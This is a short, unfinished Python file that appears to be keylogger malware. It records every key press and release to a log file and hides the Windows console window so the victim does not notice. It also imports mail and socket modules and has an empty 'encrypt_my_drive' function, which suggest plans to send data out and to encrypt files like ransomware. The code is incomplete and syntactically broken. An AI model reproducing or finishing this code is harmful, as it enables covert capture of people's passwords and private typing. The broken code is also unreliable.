from pynput.keyboard import Key, Listener
import smtplib
import socket
import crypto

f = open("log.txt",'w')

def on_press(key):
    f.write('{0}'.format(
        key,'\n'))

def on_release(key):
    f.write('{0}'.format(
        key,'\n'))
    if key == Key.esc:
        # Stop listener
        return False

def collect():
    # Collect events until released
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def encrypt_my_drive(folder):
    

def main():
    hide()
    collect()
